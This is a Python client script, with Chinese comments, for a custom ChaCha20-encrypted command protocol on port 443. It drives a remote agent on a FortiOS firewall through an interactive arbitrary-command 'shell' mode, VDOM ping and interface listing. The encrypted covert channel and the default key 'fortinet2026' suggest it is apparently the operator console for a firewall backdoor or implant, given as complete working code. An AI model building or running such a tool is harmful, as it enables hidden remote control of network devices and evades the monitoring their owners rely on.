#!/usr/bin/env python3
import socket
import json
import sys
import hashlib
import hmac

HOST = sys.argv[1] if len(sys.argv) > 1 else "192.168.2.128"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 443
SECRET = sys.argv[3] if len(sys.argv) > 3 else "fortinet2026"


class ConnectionLost(Exception):
    pass


class ChaCha20:
    """纯 Python 实现的 ChaCha20 流密码（仅使用标准库）"""

    def __init__(self, key: bytes, nonce: bytes = b"\x00" * 12, counter: int = 0):
        if len(key) != 32:
            raise ValueError("ChaCha20 key must be 32 bytes")
        if len(nonce) != 12:
            raise ValueError("ChaCha20 nonce must be 12 bytes")
        self.key = key
        self.nonce = nonce
        self.counter = counter
        self._block = b""
        self._block_pos = 64  # 强制首次调用时生成新块

    @staticmethod
    def _quarter_round(state, a, b, c, d):
        state[a] = (state[a] + state[b]) & 0xFFFFFFFF
        state[d] = (((state[d] ^ state[a]) << 16) | ((state[d] ^ state[a]) >> 16)) & 0xFFFFFFFF
        state[c] = (state[c] + state[d]) & 0xFFFFFFFF
        state[b] = (((state[b] ^ state[c]) << 12) | ((state[b] ^ state[c]) >> 20)) & 0xFFFFFFFF
        state[a] = (state[a] + state[b]) & 0xFFFFFFFF
        state[d] = (((state[d] ^ state[a]) << 8) | ((state[d] ^ state[a]) >> 24)) & 0xFFFFFFFF
        state[c] = (state[c] + state[d]) & 0xFFFFFFFF
        state[b] = (((state[b] ^ state[c]) << 7) | ((state[b] ^ state[c]) >> 25)) & 0xFFFFFFFF

    def _generate_block(self) -> bytes:
        constants = [0x61707865, 0x3320646E, 0x79622D32, 0x6B206574]
        key_words = [int.from_bytes(self.key[i : i + 4], "little") for i in range(0, 32, 4)]
        nonce_words = [int.from_bytes(self.nonce[i : i + 4], "little") for i in range(0, 12, 4)]
        state = constants + key_words + [self.counter & 0xFFFFFFFF] + nonce_words
        working = state[:]

        for _ in range(10):
            self._quarter_round(working, 0, 4, 8, 12)
            self._quarter_round(working, 1, 5, 9, 13)
            self._quarter_round(working, 2, 6, 10, 14)
            self._quarter_round(working, 3, 7, 11, 15)
            self._quarter_round(working, 0, 5, 10, 15)
            self._quarter_round(working, 1, 6, 11, 12)
            self._quarter_round(working, 2, 7, 8, 13)
            self._quarter_round(working, 3, 4, 9, 14)

        out = b"".join(
            ((working[i] + state[i]) & 0xFFFFFFFF).to_bytes(4, "little")
            for i in range(16)
        )
        self.counter += 1
        return out

    def crypt(self, data: bytes) -> bytes:
        """加密/解密同一函数：与密钥流做 XOR"""
        if not data:
            return data
        result = bytearray(len(data))
        i = 0
        while i < len(data):
            if self._block_pos >= 64:
                self._block = self._generate_block()
                self._block_pos = 0
            take = min(len(data) - i, 64 - self._block_pos)
            for j in range(take):
                result[i + j] = data[i + j] ^ self._block[self._block_pos + j]
            i += take
            self._block_pos += take
        return bytes(result)


def derive_keys(secret: str):
    """从共享口令派生两个方向的 32 字节 ChaCha20 密钥"""
    master = hashlib.sha256(secret.encode("utf-8")).digest()
    k_cts = hmac.new(master, b"client-to-server", hashlib.sha256).digest()
    k_stc = hmac.new(master, b"server-to-client", hashlib.sha256).digest()
    return k_cts, k_stc


class EncryptedSocket:
    """在普通 socket 上做透明 ChaCha20 加解密包装"""

    def __init__(self, sock, send_key: bytes, recv_key: bytes):
        self._sock = sock
        self._send_cipher = ChaCha20(send_key)
        self._recv_cipher = ChaCha20(recv_key)

    def sendall(self, data: bytes):
        if data:
            self._sock.sendall(self._send_cipher.crypt(data))

    def recv(self, n: int) -> bytes:
        data = self._sock.recv(n)
        if not data:
            return data
        return self._recv_cipher.crypt(data)

    def settimeout(self, timeout):
        self._sock.settimeout(timeout)

    def shutdown(self, how):
        self._sock.shutdown(how)

    def close(self):
        self._sock.close()


def pack_frame(cmd, ip="", port=0, payload=b""):
    """打包自定义二进制帧
    格式：CMD(2 hex) | IP_LEN(2 hex) | PORT(4 hex) | PAYLOAD_LEN(8 hex) | IP | PAYLOAD
    """
    ip_bytes = ip.encode("ascii")
    ip_len = len(ip_bytes)
    header = (
        cmd
        + format(ip_len, "02x")
        + format(port, "04x")
        + format(len(payload), "08x")
    )
    return header.encode("ascii") + ip_bytes + payload


def recv_exact(sock, n):
    buf = b""
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            return None
        buf += chunk
    return buf


def recv_frame(sock):
    """接收一帧，返回 dict(cmd, ip, port, payload)"""
    header = recv_exact(sock, 16)
    if header is None:
        return None
    cmd = header[0:2].decode("ascii")
    ip_len = int(header[2:4], 16)
    port = int(header[4:8], 16)
    payload_len = int(header[8:16], 16)
    body = recv_exact(sock, ip_len + payload_len)
    if body is None:
        return None
    ip = body[0:ip_len].decode("ascii")
    payload = body[ip_len:]
    return {"cmd": cmd, "ip": ip, "port": port, "payload": payload}


def send_json_cmd(sock, cmd, ip="", port=0, payload=b""):
    sock.sendall(pack_frame(cmd, ip, port, payload))


def recv_json_response(sock):
    frame = recv_frame(sock)
    if frame is None:
        raise ConnectionLost()
    if frame["cmd"] != "FF":
        print(f"[!] Unexpected response cmd: {frame['cmd']}")
        return None
    try:
        return json.loads(frame["payload"].decode("utf-8"))
    except Exception as e:
        print(f"[!] Failed to parse response: {e}")
        return None


def print_result(result):
    if not result:
        return
    if result.get("error"):
        print(f"error: {result['error']}")
    if result.get("stdout"):
        print(result["stdout"], end="")
    if result.get("stderr"):
        print(result["stderr"], end="")
    print(f"\n(exit code: {result.get('code', -1)})")


def parse_info_output(stdout):
    """解析 FortiOS 'show system interface' 输出为接口列表"""
    interfaces = []
    current = None
    for raw in stdout.splitlines():
        line = raw.strip()
        if line.startswith('edit "'):
            name = line[5:].strip().strip('"')
            current = {"intf": name, "vdom": "", "ip": "", "netmask": "", "type": ""}
        elif current and line.startswith('set vdom "'):
            current["vdom"] = line[10:].strip().strip('"')
        elif current and line.startswith("set ip "):
            parts = line[7:].strip().split()
            current["ip"] = parts[0] if len(parts) > 0 else ""
            current["netmask"] = parts[1] if len(parts) > 1 else ""
        elif current and line.startswith("set type "):
            current["type"] = line[9:].strip()
        elif line in ("next", "end"):
            if current:
                interfaces.append(current)
                current = None
    if current:
        interfaces.append(current)
    return interfaces


def print_info_table(interfaces):
    if not interfaces:
        print("[!] No interface info parsed")
        return
    headers = ["vdom-name", "intf-name", "ip-addr", "netmask", "type"]
    keys = ["vdom", "intf", "ip", "netmask", "type"]
    widths = [max(len(headers[i]), max(len(str(r.get(keys[i], ""))) for r in interfaces)) for i in range(len(headers))]
    header_row = "  ".join(headers[i].ljust(widths[i]) for i in range(len(headers)))
    print(header_row)
    print("-" * len(header_row))
    for r in interfaces:
        row = "  ".join(str(r.get(keys[i], "")).ljust(widths[i]) for i in range(len(headers)))
        print(row)


def connect():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(10)
    try:
        sock.connect((HOST, PORT))
        # 连接成功后取消超时，避免长命令（如 ping、newcli）被中断
        sock.settimeout(None)
        print(f"[*] Connected to {HOST}:{PORT}\n")
        return sock
    except Exception as e:
        print(f"[!] Connect failed: {e}")
        sys.exit(1)


def print_main_menu():
    print("Select mode:")
    print("  1) Info mode")
    print("  2) Ping mode")
    print("  3) Shell mode")
    print("  0) Quit program")


def shell_loop(sock):
    print("\n[*] Shell mode (type 'quit' to return)")
    while True:
        try:
            cmd = input("shell> ").strip()
        except (EOFError, KeyboardInterrupt):
            print()
            return
        if not cmd:
            continue
        if cmd.lower() == "quit":
            return
        try:
            send_json_cmd(sock, "01", "", 0, cmd.encode("utf-8"))
            result = recv_json_response(sock)
            print_result(result)
        except ConnectionLost:
            raise


def ping_loop(sock):
    print("\n[*] Ping mode (type 'quit' to return)")
    print("Tip: enter '<vdom> <ip>' to ping inside a VDOM via newcli.")
    while True:
        try:
            line = input("ping target> ").strip()
        except (EOFError, KeyboardInterrupt):
            print()
            return
        if not line:
            continue
        if line.lower() == "quit":
            return
        parts = line.split()
        if len(parts) >= 2:
            vdom = parts[0]
            target = parts[1]
            try:
                send_json_cmd(sock, "02", target, 0, vdom.encode("utf-8"))
                result = recv_json_response(sock)
                print_result(result)
            except ConnectionLost:
                raise
        else:
            try:
                send_json_cmd(sock, "02", line, 0, b"")
                result = recv_json_response(sock)
                print_result(result)
            except ConnectionLost:
                raise


def info_loop(sock):
    print("\n[*] Info mode: show system interface")
    try:
        send_json_cmd(sock, "07", "", 0, b"")
        result = recv_json_response(sock)
    except ConnectionLost:
        raise
    if not result:
        return
    if result.get("error"):
        print(f"error: {result['error']}")
        return
    interfaces = parse_info_output(result.get("stdout", ""))
    print_info_table(interfaces)


def main():
    if SECRET == "fortinet2026":
        print("[!] Warning: using default encryption key. Use: python client.py <host> <port> <secret>")

    plain_sock = connect()
    k_cts, k_stc = derive_keys(SECRET)
    sock = EncryptedSocket(plain_sock, k_cts, k_stc)

    while True:
        print_main_menu()
        try:
            choice = input("mode> ").strip().lower()
        except (EOFError, KeyboardInterrupt):
            print()
            break

        if choice in ("0", "quit", "exit"):
            try:
                send_json_cmd(sock, "05", "", 0, b"")
                frame = recv_frame(sock)
                if frame:
                    print(frame["payload"].decode("utf-8").strip())
            except Exception:
                pass
            break

        try:
            if choice == "1":
                info_loop(sock)
            elif choice == "2":
                ping_loop(sock)
            elif choice == "3":
                shell_loop(sock)
            else:
                print("[!] Invalid choice")
        except ConnectionLost:
            print("[*] Connection lost, reconnecting...")
            try:
                sock.close()
            except Exception:
                pass
            plain_sock = connect()
            sock = EncryptedSocket(plain_sock, k_cts, k_stc)

    try:
        sock.close()
    except Exception:
        pass
    print("[*] Disconnected")


if __name__ == "__main__":
    main()
